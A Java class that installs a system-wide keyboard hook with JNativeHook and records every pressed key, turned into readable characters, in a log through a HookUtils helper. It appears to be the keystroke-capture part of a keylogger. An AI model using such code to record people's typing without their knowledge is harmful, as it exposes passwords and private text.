package org.example.keys;

import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import org.example.utils.HookUtils;

public class GlobalKeyListener implements NativeKeyListener {

    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyPressed = NativeKeyEvent.getKeyText(e.getKeyCode());
        System.out.println("Key pressed: " + keyPressed);
        String finalKeyName;
        switch (keyPressed) {
            case "Return":
            case "Enter":
                finalKeyName = "\n";
                break;
            case "Space":
                finalKeyName = " ";
                break;
            case "Period":
                finalKeyName = ".";
                break;
            case "Comma":
                finalKeyName = ",";
                break;
            case "Semicolon":
                finalKeyName = ";";
                break;
            default:
                finalKeyName = keyPressed;
                break;
        }
        HookUtils.addLogs(finalKeyName + " ");
    }


//    public void nativeKeyTyped(NativeKeyEvent e) {
//        System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
//    }

}
